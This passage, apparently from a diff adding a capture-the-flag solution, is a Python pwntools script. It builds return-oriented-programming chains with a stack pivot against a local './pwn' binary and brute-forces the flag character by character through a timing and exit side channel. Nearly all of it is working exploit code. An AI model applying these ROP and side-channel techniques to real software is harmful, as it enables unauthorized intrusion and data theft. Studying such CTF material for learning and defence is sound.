+	pay2 = pay2 + '\x00'*(0x80-len(pay2))
+	#print len(pay2)
+	#由于输入长度有限，被迫做栈迁移。
+
+
+	pay3 = p64(poprdiret) + p64(0)  + p64(eaxret) + p64(poprdiret) + p64(3) + p64(rsir15ret) + p64(bss+0x400) + p64(0) + p64(0x400A57) + p64(poprdiret)+p64(ord(dic[x])) + p64(eaxret) + p64(poprdiret) + p64(bss+0x400+y) + p64(cmpjge) + p64(readaddr)
+	pay3 = pay3 + '\x00'*(0x80-len(pay3))
+	#if match , program will exit otherwise wait for input
+
+	#fd = 3
+
+	#gdb.attach(io,'''
+	#b *0x0000000000400a32
+	#''')
+
+	io.send(pay2)
+#debug()
+	sleep(0.1)
+	io.send(pay3)
+	#io.interactive()
+	success('trying '+dic[x]+'@'+str(y))
+	try:
+		#io.recv()
+		io.recv(timeout=0.5)
+	except EOFError:
+		return dic[x]
+	return 0
+#io.interactive()
+x=-1
+y=0
+f=''
+flag = ''
+while True:
+	x=x+1
+	io = process('./pwn')
+	f = check(io,x,y)
+	if f:
+		flag += f
+		y = y+1
+		x = -1
+	io.close()
+	print flag
+```
